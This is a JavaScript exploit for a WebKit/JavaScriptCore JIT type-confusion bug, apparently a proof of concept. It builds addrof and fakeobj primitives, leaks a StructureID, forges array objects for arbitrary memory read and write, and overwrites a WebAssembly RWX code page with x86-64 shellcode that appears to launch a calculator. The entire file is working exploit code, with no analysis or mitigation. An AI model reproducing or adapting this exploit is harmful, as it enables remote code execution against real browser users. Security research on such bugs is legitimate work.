const MAX_ITERATIONS = 0xc0000;

const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);
// Floating point to 64-bit unsigned integer
function f2i(val)
{ 
    f64[0] = val;
    // let tmp = Array.from(u32);
    return u32[1] * 0x100000000 + u32[0];
}
// 64-bit unsigned integer to Floating point
function i2f(val)
{
    let tmp = [];
    tmp[0] = parseInt(val % 0x100000000);
    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
    u32.set(tmp);
    return f64[0];
}

// 64-bit unsigned integer to jsValue
function i2obj(val)
{
    return i2f(val-0x02000000000000);
}

// 64-bit unsigned integer to hex
function hex(i)
{
    return "0x"+i.toString(16).padStart(16, "0");
}

function wasm_func() {
    var wasmImports = {
        env: {
            puts: function puts (index) {
                print(utf8ToString(h, index));
            }
        }
    };
    
    var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,137,128,128,128,0,2,
        96,1,127,1,127,96,0,0,2,140,128,128,128,0,1,3,101,110,118,4,112,117,
        116,115,0,0,3,130,128,128,128,0,1,1,4,132,128,128,128,0,1,112,0,0,5,
        131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,
        109,101,109,111,114,121,2,0,5,104,101,108,108,111,0,1,10,141,128,128,
        128,0,1,135,128,128,128,0,0,65,16,16,0,26,11,11,146,128,128,128,0,1,0,
        65,16,11,12,72,101,108,108,111,32,87,111,114,108,100,0]);
    let m = new WebAssembly.Instance(new WebAssembly.Module(buffer),wasmImports);
    let h = new Uint8Array(m.exports.memory.buffer);
    return m.exports.hello;  
}
// wasm obj
wasmFunc = wasm_func();



let noCoW = 13.37;
let template = [1.1, 2.2, 3.3];
template.x = {};

let arr = [noCoW, 2.2, 3.3];

// print(describe(arr));
function AddrOfFoo(arr, cmpObj)
{
    arr[1] = 1.1;
    cmpObj == 2.2;  // trigger callback
    return arr[0];
}
// optimize compile AddrOfFoo
for( let i=0; i<MAX_ITERATIONS; i++ ) {
    AddrOfFoo(arr, {});
}
// addr_of primitive with vuln
function AddrOf(obj) {
    
    
    let arr = new Array(noCoW, 2,2, 3.3);
    // print(describe(arr));
    let evil = {
        // vuln callback
        toString: () => {
            arr[0] = obj;
        }
    }

    let addr = AddrOfFoo(arr, evil);
    return f2i(addr);
}

function FakeObjFoo(arr, cmpObj, addr)
{
    arr[1] = 1.1;
    cmpObj == 2.2;  // trigger callback
    arr[0] = addr;
}
// optimize compiler FakeObjFoo
for( let i=0; i<MAX_ITERATIONS; i++ ) {
    FakeObjFoo(arr, {}, 1.1);
}
// fake_obj primitive with vuln
function FakeObj(addr) {
    
    addr = i2f(addr);
    let arr = new Array(noCoW, 2.2, 3.3);

    let evil = {
        // vuln callback
        toString: () => {
            arr[0] = {};
        }
    }


    FakeObjFoo(arr, evil, addr);
    return arr[0];
}

/*
// AddrOf and FakeObj primitives tests
let obj = [1.1, 2.2, 3.3];
print(describe(obj));
let objAddr = AddrOf(obj);
print(hex(objAddr));
let fakeObj = FakeObj(objAddr);
print(describe(fakeObj));
*/

// leak entropy by functionProtoFuncToString
function LeakStructureID(obj)
{
    // https://i.blackhat.com/eu-19/Thursday/eu-19-Wang-Thinking-Outside-The-JIT-Compiler-Understanding-And-Bypassing-StructureID-Randomization-With-Generic-And-Old-School-Methods.pdf

    var unlinkedFunctionExecutable = {
        m_isBuitinFunction: i2f(0xdeadbeef),
        pad1: 1, pad2: 2, pad3: 3, pad4: 4, pad5: 5, pad6: 6,
        m_identifier: {},
    };

    var fakeFunctionExecutable = {
      pad0: 0, pad1: 1, pad2: 2, pad3: 3, pad4: 4, pad5: 5, pad6: 6, pad7: 7, pad8: 8,
      m_executable: unlinkedFunctionExecutable,
    };

    var container = {
      jscell: i2f(0x00001a0000000000),
      butterfly: {},
      pad: 0,
      m_functionExecutable: fakeFunctionExecutable,
    };


    let fakeObjAddr = AddrOf(container) + 0x10;
    let fakeObj = FakeObj(fakeObjAddr);

    unlinkedFunctionExecutable.m_identifier = fakeObj;
    container.butterfly = arrLeak;

    var nameStr = Function.prototype.toString.call(fakeObj);

    let structureID = nameStr.charCodeAt(9);

    // repair the fakeObj's jscell
    u32[0] = structureID;
    u32[1] = 0x01082309-0x20000;
    container.jscell = f64[0];
    return structureID;
}

// leak entropy by getByVal
function LeakStructureID2(obj)
{
    let container = {
        cellHeader: i2obj(0x0108230700000000),
        butterfly: obj
    };

    let fakeObjAddr = AddrOf(container) + 0x10;
    let fakeObj = FakeObj(fakeObjAddr);
    f64[0] = fakeObj[0];

    // print(123); 
    let structureID = u32[0];
    u32[1] = 0x01082307 - 0x20000;
    container.cellHeader = f64[0];

    return structureID;
}

let pad = new Array(noCoW, 2.2, {}, 13.37);
let pad1 = new Array(noCoW, 2.2, {}, 13.37, 5.5, 6.6, 7.7, 8,8);
let pad2 = new Array(noCoW, 2.2, {}, 13.37, 5.5, 6.6, 7.7, 8,8);
var arrLeak = new Array(noCoW, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8);
// print(describe(pad));
// print(describe(arrLeak)); 
// let structureID = LeakStructureID2(arrLeak);
let structureID = LeakStructureID(arrLeak);
print("[+] leak structureID: "+hex(structureID));

pad = [{}, {}, {}];
var victim = [noCoW, 14.47, 15.57];
victim['prop'] = 13.37;
victim['prop_0'] = 13.37;

u32[0] = structureID;
u32[1] = 0x01082309-0x20000;
// container to store fake driver object
var container = {
    cellHeader: f64[0],
    butterfly: victim   
};
// build fake driver
var containerAddr = AddrOf(container);
var fakeArrAddr = containerAddr + 0x10;
print("[+] fake driver object addr: "+hex(fakeArrAddr));
var driver = FakeObj(fakeArrAddr);

// ArrayWithDouble
var unboxed = [noCoW, 13.37, 13.37];
// ArrayWithContiguous
var boxed = [{}];

// leak unboxed butterfly's addr
driver[1] = unboxed;
var sharedButterfly = victim[1];
print("[+] shared butterfly addr: " + hex(f2i(sharedButterfly)));
// now the boxed array and unboxed array share the same butterfly
driver[1] = boxed;
victim[1] = sharedButterfly;
// print(describe(boxed));
// print(describe(unboxed));


// set driver's cell header to double array
u32[0] = structureID;
u32[1] = 0x01082307-0x20000;
container.cellHeader = f64[0];

function NewAddrOf(obj) {
    boxed[0] = obj;
    return f2i(unboxed[0]);
}

function NewFakeObj(addr) {
    unboxed[0] = i2f(addr);
    return boxed[0];            
}

function Read64(addr) {
    driver[1] = i2f(addr+0x10);
    return NewAddrOf(victim.prop);
    // return f2i(victim.prop);
}

function Write64(addr, val) {
    driver[1] = i2f(addr+0x10);
    // victim.prop = this.fake_obj(val);
    victim.prop = i2f(val);
}

function ByteToDwordArray(payload)
{

    let sc = []
    let tmp = 0;
    let len = Math.ceil(payload.length/6)
    for (let i = 0; i < len; i += 1) {
        tmp = 0;
        pow = 1;
        for(let j=0; j<6; j++){
            let c = payload[i*6+j]
            if(c === undefined) {
                c = 0;
            }
            pow = j==0 ? 1 : 256 * pow;
            tmp += c * pow;
        }
        tmp += 0xc000000000000;
        sc.push(tmp);
    }
    return sc;
}

function ArbitraryWrite(addr, payload) 
{
    let sc = ByteToDwordArray(payload);
    for(let i=0; i<sc.length; i++) {
        Write64(addr+i*6, sc[i]);
    }
}

// leak rwx addr
let wasmObjAddr = NewAddrOf(wasmFunc);
print("[+] wasm obj addr: " + hex(wasmObjAddr));
let codeAddr = Read64(wasmObjAddr + 0x38);
let rwxAddr = Read64(codeAddr);
print("[+] rwx addr: " + hex(rwxAddr));

var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
    96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
    105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
    72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
    72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
    184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
    94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];
// write shellcode to rwx mem
ArbitraryWrite(rwxAddr, shellcode);

// trigger shellcode to execute
wasmFunc();
/*
*/
